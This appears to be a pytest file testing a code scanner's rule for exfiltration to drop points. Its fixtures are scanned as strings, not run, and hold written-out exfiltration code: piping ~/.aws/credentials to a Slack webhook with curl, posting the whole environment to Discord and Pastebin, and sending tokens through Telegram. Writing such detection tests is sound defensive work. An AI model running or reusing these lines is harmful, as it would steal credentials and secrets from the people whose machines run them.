"""The two halves of `SUSPECT.EXFIL.DROP_POINT.001`, read by the tree (reviews/pypi-98/21): text is not a read,
one token is not two signals, a destination only named is not where anything is sent, and a setting is
judged by the tree. Each quiet shape has a twin that keeps the rule firing. Hosts are the real drop points
the rule exists for; the fixtures send nothing anywhere: they are scanned, never run."""

from __future__ import annotations

import pytest

from cordon_scanner import Scanner
from cordon_scanner.foundation.config.settings import Config

RULE = "SUSPECT.EXFIL.DROP_POINT.001"
HOOK = "https://hooks.slack.com/services/T0000000/B0000000/XXXXXXXXXXXXXXXXXXXXXXXX"


class Kit:
    @staticmethod
    def fires(tmp_path, source: str, name: str = "tool.py") -> bool:
        (tmp_path / name).write_text(source, encoding="utf-8")
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        return any(f.rule_id == RULE for f in result.findings)


class TestTextIsNotARead:
    TABLE = (
        "RULES = [\n"
        '    {"id": "aws", "pattern": "cat ~/.aws/credentials", "sink": "' + HOOK + '"},\n'
        "]\n"
        "def scan(text):\n"
        '    return [r for r in RULES if r["id"] in text]\n'
    )

    def test_a_rule_table_naming_a_store_and_a_webhook_is_quiet(self, tmp_path) -> None:
        assert not Kit.fires(tmp_path, self.TABLE)

    @pytest.mark.parametrize(
        "source",
        [
            "import os\n"
            f'os.system("cat ~/.aws/credentials | curl -d @- {HOOK}")\n',
            "import subprocess\n"
            f'CMD = "cat ~/.aws/credentials | curl -d @- {HOOK}"\n'
            "subprocess.run(CMD, shell=True)\n",
            "def go():\n"
            f'    exec("import urllib.request as u; u.urlopen(\'{HOOK}\', open(\'.aws/credentials\', \'rb\').read())")\n',
            "import requests, os\n"
            "def go(home):\n"
            f'    requests.post("{HOOK}", data=open(f"{{home}}/.aws/credentials").read())\n',
        ],
        ids=["os.system string", "named subprocess string", "exec string", "f-string expression"],
    )
    def test_a_string_that_is_run_or_an_expression_keeps_it(self, tmp_path, source) -> None:
        assert Kit.fires(tmp_path, source)

    def test_a_file_that_does_not_parse_keeps_the_text_reading(self, tmp_path) -> None:
        assert Kit.fires(tmp_path, "def (:\n" + self.TABLE)

    def test_a_template_is_not_code(self, tmp_path) -> None:
        page = f"<p>Copy ~/.aws/credentials to {HOOK}</p>\n<script>var k = 'cat ~/.aws/credentials';</script>\n"
        assert not Kit.fires(tmp_path, page, "index.html")

    def test_a_shell_script_with_the_same_text_is_code(self, tmp_path) -> None:
        script = f"#!/bin/sh\ncat ~/.aws/credentials | curl -d @- {HOOK}\n"
        assert Kit.fires(tmp_path, script, "run.sh")


class TestOneTokenIsNotTwoSignals:
    def test_a_public_address_written_once_is_quiet(self, tmp_path) -> None:
        source = 'SERVERS = [{"host": "120.26.166.13", "port": 3478}]\n'
        assert not Kit.fires(tmp_path, source)

    def test_the_address_used_with_a_separate_lookup_of_the_machines_is_not(self, tmp_path) -> None:
        source = (
            "import requests\n"
            'ip = requests.get("https://api.ipify.org").text\n'
            'requests.post("http://120.26.166.13/c", data=ip)\n'
        )
        assert Kit.fires(tmp_path, source)


class TestADestinationOnlyNamed:
    LOOT = "import os\ndef env():\n    return dict(os.environ)\n"

    @pytest.mark.parametrize(
        "named",
        [
            'DENY = frozenset({"pastebin.com"})\ndef allowed(host):\n    return host not in DENY\n',
            'def check(url):\n    raise ValueError("send the report to https://discord.com/api/webhooks/1/x")\n',
            'def help():\n    print("paste your output at https://paste.rs")\n',
        ],
        ids=["a deny-list", "an exception message", "a printed message"],
    )
    def test_a_host_that_is_a_message_or_a_deny_list_is_quiet(self, tmp_path, named) -> None:
        assert not Kit.fires(tmp_path, self.LOOT + named)

    @pytest.mark.parametrize(
        "sent",
        [
            'import requests\nHOOK = "https://discord.com/api/webhooks/1/x"\n'
            "requests.post(HOOK, data=dict(os.environ))\n",
            'import requests\nCFG = {"hook": "https://discord.com/api/webhooks/1/x"}\n'
            'requests.post(CFG["hook"], data=dict(os.environ))\n',
            "import urllib.request as u\n"
            'HOOKS = ["https://discord.com/api/webhooks/1/x", "https://pastebin.com/api/api_post.php"]\n'
            "for h in HOOKS:\n    u.urlopen(u.Request(h, data=repr(dict(os.environ)).encode()))\n",
            "import requests\nclass Sink:\n"
            '    url = "https://discord.com/api/webhooks/1/x"\n'
            "    def go(self):\n        requests.post(self.url, data=dict(os.environ))\n",
        ],
        ids=["a constant", "a dict item", "an iterated list", "a class attribute"],
    )
    def test_a_host_that_reaches_a_request_or_is_not_resolved_fires(self, tmp_path, sent) -> None:
        assert Kit.fires(tmp_path, self.LOOT + sent)

    def test_a_message_through_a_class_the_file_defines_is_not_a_message(self, tmp_path) -> None:
        source = (
            self.LOOT
            + "import requests\nclass SendError(Exception):\n"
            "    def __init__(self, url):\n        requests.post(url, data=dict(os.environ))\n"
            'def go():\n    raise SendError("https://discord.com/api/webhooks/1/x")\n'
        )
        assert Kit.fires(tmp_path, source)


class TestASettingReadByTheTree:
    @staticmethod
    def notifier(reads: str) -> str:
        return (
            "import os, json, requests\n"
            f"value = {reads}\n"
            "def notify(text):\n"
            "    requests.post(\n"
            '        "https://api.telegram.org/bot%s/sendMessage" % os.getenv("TG_TOKEN"),\n'
            '        json={"chat_id": os.getenv("TG_CHAT"), "text": text, "v": str(value)},\n'
            "    )\n"
        )

    @pytest.mark.parametrize(
        "reads",
        [
            'json.load(open("c.json")).get("a") or os.environ.get("TG_MODE")',
            '{n: os.environ.get(n) for n in ("TG_MODE", "TG_LEVEL")}',
        ],
        ids=["a literal inside a longer expression", "a comprehension over literals"],
    )
    def test_a_setting_the_tree_shows_is_quiet(self, tmp_path, reads) -> None:
        assert not Kit.fires(tmp_path, self.notifier(reads))

    @pytest.mark.parametrize(
        "reads",
        [
            '{n: os.environ.get(n) for n in ("TG_MODE", "NPM_TOKEN")}',
            "{k: v for k, v in os.environ.items()}",
            "os.environ.get(os.sys.argv[1])",
            'dict(os.environ) or os.environ.get("TG_MODE")',
        ],
        ids=["a credential name in the list", "the whole environment", "a name from outside", "a dump beside a setting"],
    )
    def test_a_credential_the_environment_or_an_unbounded_name_fires(self, tmp_path, reads) -> None:
        assert Kit.fires(tmp_path, self.notifier(reads))
